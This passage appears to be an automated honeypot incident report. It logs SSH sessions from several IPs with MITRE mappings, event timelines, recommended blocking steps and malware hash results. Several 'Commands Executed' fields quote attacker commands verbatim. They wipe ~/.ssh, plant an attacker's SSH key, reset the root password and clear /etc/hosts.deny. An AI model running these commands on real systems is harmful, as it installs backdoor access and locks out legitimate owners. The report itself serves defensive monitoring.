| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:20:30` | `cowrie.session.connect` |
| `2026-05-22 19:20:30` | `cowrie.client.version` |
| `2026-05-22 19:20:30` | `cowrie.client.kex` |
| `2026-05-22 19:20:30` | `cowrie.login.success` |
| `2026-05-22 19:20:30` | `cowrie.session.params` |
| `2026-05-22 19:20:30` | `cowrie.command.input` |
| `2026-05-22 19:20:30` | `cowrie.command.failed` |
| `2026-05-22 19:20:31` | `cowrie.log.closed` |
| `2026-05-22 19:20:31` | `cowrie.session.params` |
| `2026-05-22 19:20:31` | `cowrie.command.input` |
| `2026-05-22 19:20:31` | `cowrie.session.file_download` |
| `2026-05-22 19:20:31` | `cowrie.log.closed` |
| `2026-05-22 19:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-674fa72d578f

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-22 19:20 |
| **Last Seen** | 2026-05-22 19:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:20:32` | `cowrie.session.connect` |
| `2026-05-22 19:20:32` | `cowrie.client.version` |
| `2026-05-22 19:20:32` | `cowrie.client.kex` |
| `2026-05-22 19:20:32` | `cowrie.login.success` |
| `2026-05-22 19:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c13ce867bf5c

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-22 19:24 |
| **Last Seen** | 2026-05-22 19:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:24:48` | `cowrie.session.connect` |
| `2026-05-22 19:24:48` | `cowrie.client.version` |
| `2026-05-22 19:24:48` | `cowrie.client.kex` |
| `2026-05-22 19:24:48` | `cowrie.login.success` |
| `2026-05-22 19:24:48` | `cowrie.session.params` |
| `2026-05-22 19:24:48` | `cowrie.command.input` |
| `2026-05-22 19:24:48` | `cowrie.command.failed` |
| `2026-05-22 19:24:49` | `cowrie.log.closed` |
| `2026-05-22 19:24:49` | `cowrie.session.params` |
| `2026-05-22 19:24:49` | `cowrie.command.input` |
| `2026-05-22 19:24:49` | `cowrie.session.file_download` |
| `2026-05-22 19:24:49` | `cowrie.log.closed` |
| `2026-05-22 19:24:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfb81899db43

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-22 19:24 |
| **Last Seen** | 2026-05-22 19:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:24:50` | `cowrie.session.connect` |
| `2026-05-22 19:24:50` | `cowrie.client.version` |
| `2026-05-22 19:24:50` | `cowrie.client.kex` |
| `2026-05-22 19:24:50` | `cowrie.login.success` |
| `2026-05-22 19:24:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2f2df7ce9e3

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-22 19:27 |
| **Last Seen** | 2026-05-22 19:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:27:32` | `cowrie.session.connect` |
| `2026-05-22 19:27:32` | `cowrie.client.version` |
| `2026-05-22 19:27:33` | `cowrie.client.kex` |
| `2026-05-22 19:27:34` | `cowrie.login.success` |
| `2026-05-22 19:27:34` | `cowrie.session.params` |
| `2026-05-22 19:27:34` | `cowrie.command.input` |
| `2026-05-22 19:27:34` | `cowrie.command.failed` |
| `2026-05-22 19:27:34` | `cowrie.log.closed` |
| `2026-05-22 19:27:35` | `cowrie.session.params` |
| `2026-05-22 19:27:35` | `cowrie.command.input` |
| `2026-05-22 19:27:35` | `cowrie.session.file_download` |
| `2026-05-22 19:27:35` | `cowrie.log.closed` |
| `2026-05-22 19:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92bb029e833b

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-22 19:27 |
| **Last Seen** | 2026-05-22 19:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:27:37` | `cowrie.session.connect` |
| `2026-05-22 19:27:37` | `cowrie.client.version` |
| `2026-05-22 19:27:38` | `cowrie.client.kex` |
| `2026-05-22 19:27:39` | `cowrie.login.success` |
| `2026-05-22 19:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5bb570e022c

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-22 19:31 |
| **Last Seen** | 2026-05-22 19:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:31:44` | `cowrie.session.connect` |
| `2026-05-22 19:31:44` | `cowrie.client.version` |
| `2026-05-22 19:31:44` | `cowrie.client.kex` |
| `2026-05-22 19:31:45` | `cowrie.login.success` |
| `2026-05-22 19:31:46` | `cowrie.session.params` |
| `2026-05-22 19:31:46` | `cowrie.command.input` |
| `2026-05-22 19:31:46` | `cowrie.command.failed` |
| `2026-05-22 19:31:46` | `cowrie.log.closed` |
| `2026-05-22 19:31:46` | `cowrie.session.params` |
| `2026-05-22 19:31:46` | `cowrie.command.input` |
| `2026-05-22 19:31:47` | `cowrie.session.file_download` |
| `2026-05-22 19:31:47` | `cowrie.log.closed` |
| `2026-05-22 19:31:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b0c761c90a2

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-22 19:31 |
| **Last Seen** | 2026-05-22 19:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:31:49` | `cowrie.session.connect` |
| `2026-05-22 19:31:49` | `cowrie.client.version` |
| `2026-05-22 19:31:49` | `cowrie.client.kex` |
| `2026-05-22 19:31:50` | `cowrie.login.success` |
| `2026-05-22 19:31:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23f1cc694520

| Field | Detail |
|---|---|
| **Source IP** | `118.122.147[.]49` |
| **First Seen** | 2026-05-22 19:34 |
| **Last Seen** | 2026-05-22 19:35 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:DRxYZe5HSXFf"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:34:46` | `cowrie.session.connect` |
| `2026-05-22 19:34:47` | `cowrie.client.version` |
| `2026-05-22 19:34:47` | `cowrie.client.kex` |
| `2026-05-22 19:34:48` | `cowrie.login.success` |
| `2026-05-22 19:34:48` | `cowrie.session.params` |
| `2026-05-22 19:34:48` | `cowrie.command.input` |
| `2026-05-22 19:34:48` | `cowrie.command.failed` |
| `2026-05-22 19:34:49` | `cowrie.log.closed` |
| `2026-05-22 19:34:49` | `cowrie.session.params` |
| `2026-05-22 19:34:49` | `cowrie.command.input` |
| `2026-05-22 19:34:49` | `cowrie.session.file_download` |
| `2026-05-22 19:34:49` | `cowrie.log.closed` |
| `2026-05-22 19:35:17` | `cowrie.session.params` |
| `2026-05-22 19:35:17` | `cowrie.command.input` |
| `2026-05-22 19:35:17` | `cowrie.log.closed` |
| `2026-05-22 19:35:18` | `cowrie.session.params` |
| `2026-05-22 19:35:18` | `cowrie.command.input` |
| `2026-05-22 19:35:18` | `cowrie.log.closed` |
| `2026-05-22 19:35:18` | `cowrie.session.params` |
| `2026-05-22 19:35:18` | `cowrie.command.input` |
| `2026-05-22 19:35:18` | `cowrie.session.file_download` |
| `2026-05-22 19:35:18` | `cowrie.log.closed` |
| `2026-05-22 19:35:19` | `cowrie.session.params` |
| `2026-05-22 19:35:19` | `cowrie.command.input` |
| `2026-05-22 19:35:19` | `cowrie.log.closed` |
| `2026-05-22 19:35:19` | `cowrie.session.params` |
| `2026-05-22 19:35:19` | `cowrie.command.input` |
| `2026-05-22 19:35:19` | `cowrie.log.closed` |
| `2026-05-22 19:35:20` | `cowrie.session.params` |
| `2026-05-22 19:35:20` | `cowrie.command.input` |
| `2026-05-22 19:35:20` | `cowrie.command.input` |
| `2026-05-22 19:35:20` | `cowrie.log.closed` |
| `2026-05-22 19:35:20` | `cowrie.session.params` |
| `2026-05-22 19:35:20` | `cowrie.command.input` |
| `2026-05-22 19:35:21` | `cowrie.log.closed` |
| `2026-05-22 19:35:21` | `cowrie.session.params` |
| `2026-05-22 19:35:21` | `cowrie.command.input` |
| `2026-05-22 19:35:21` | `cowrie.log.closed` |
| `2026-05-22 19:35:21` | `cowrie.session.params` |
| `2026-05-22 19:35:21` | `cowrie.command.input` |
| `2026-05-22 19:35:22` | `cowrie.log.closed` |
| `2026-05-22 19:35:22` | `cowrie.session.params` |
| `2026-05-22 19:35:22` | `cowrie.command.input` |
| `2026-05-22 19:35:22` | `cowrie.log.closed` |
| `2026-05-22 19:35:22` | `cowrie.session.params` |
| `2026-05-22 19:35:22` | `cowrie.command.input` |
| `2026-05-22 19:35:23` | `cowrie.log.closed` |
| `2026-05-22 19:35:23` | `cowrie.session.params` |
| `2026-05-22 19:35:23` | `cowrie.command.input` |
| `2026-05-22 19:35:23` | `cowrie.log.closed` |
| `2026-05-22 19:35:23` | `cowrie.session.params` |
| `2026-05-22 19:35:23` | `cowrie.command.input` |
| `2026-05-22 19:35:24` | `cowrie.log.closed` |
| `2026-05-22 19:35:24` | `cowrie.session.params` |
| `2026-05-22 19:35:24` | `cowrie.command.input` |
| `2026-05-22 19:35:24` | `cowrie.log.closed` |
| `2026-05-22 19:35:24` | `cowrie.session.params` |
| `2026-05-22 19:35:24` | `cowrie.command.input` |
| `2026-05-22 19:35:25` | `cowrie.log.closed` |
| `2026-05-22 19:35:25` | `cowrie.session.params` |
| `2026-05-22 19:35:25` | `cowrie.command.input` |
| `2026-05-22 19:35:25` | `cowrie.log.closed` |
| `2026-05-22 19:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.147[.]49` to AbuseIPDB if not already reported
- [ ] Block `118.122.147[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2908e98a06b3

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-22 19:36 |
| **Last Seen** | 2026-05-22 19:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:36:07` | `cowrie.session.connect` |
| `2026-05-22 19:36:07` | `cowrie.client.version` |
| `2026-05-22 19:36:08` | `cowrie.client.kex` |
| `2026-05-22 19:36:08` | `cowrie.login.success` |
| `2026-05-22 19:36:09` | `cowrie.session.params` |
| `2026-05-22 19:36:09` | `cowrie.command.input` |
| `2026-05-22 19:36:09` | `cowrie.command.failed` |
| `2026-05-22 19:36:09` | `cowrie.log.closed` |
| `2026-05-22 19:36:09` | `cowrie.session.params` |
| `2026-05-22 19:36:09` | `cowrie.command.input` |
| `2026-05-22 19:36:10` | `cowrie.session.file_download` |
| `2026-05-22 19:36:10` | `cowrie.log.closed` |
| `2026-05-22 19:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-950dee173341

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-22 19:36 |
| **Last Seen** | 2026-05-22 19:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:36:12` | `cowrie.session.connect` |
| `2026-05-22 19:36:12` | `cowrie.client.version` |
| `2026-05-22 19:36:12` | `cowrie.client.kex` |
| `2026-05-22 19:36:13` | `cowrie.login.success` |
| `2026-05-22 19:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2521464c270

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-22 19:44 |
| **Last Seen** | 2026-05-22 19:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:44:44` | `cowrie.session.connect` |
| `2026-05-22 19:44:44` | `cowrie.client.version` |
| `2026-05-22 19:44:45` | `cowrie.client.kex` |
| `2026-05-22 19:44:45` | `cowrie.login.success` |
| `2026-05-22 19:44:46` | `cowrie.session.params` |
| `2026-05-22 19:44:46` | `cowrie.command.input` |
| `2026-05-22 19:44:46` | `cowrie.command.failed` |
| `2026-05-22 19:44:46` | `cowrie.log.closed` |
| `2026-05-22 19:44:47` | `cowrie.session.params` |
| `2026-05-22 19:44:47` | `cowrie.command.input` |
| `2026-05-22 19:44:47` | `cowrie.session.file_download` |
| `2026-05-22 19:44:47` | `cowrie.log.closed` |
| `2026-05-22 19:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-534803d40629

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]139` |
| **First Seen** | 2026-05-22 19:44 |
| **Last Seen** | 2026-05-22 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 19:44:49` | `cowrie.session.connect` |
| `2026-05-22 19:44:49` | `cowrie.client.version` |
| `2026-05-22 19:44:50` | `cowrie.client.kex` |
| `2026-05-22 19:44:50` | `cowrie.login.success` |
| `2026-05-22 19:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]139` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `197.248.207[.]139` | **15** | 2026-05-22 18:46 | 2026-05-22 19:49 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.158.40[.]65` | **11** | 2026-05-22 18:50 | 2026-05-22 19:51 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `66.132.186[.]162` | **3** | 2026-05-22 18:34 | 2026-05-22 18:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `118.122.147[.]49` | **2** | 2026-05-22 19:34 | 2026-05-22 19:37 | 4m | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
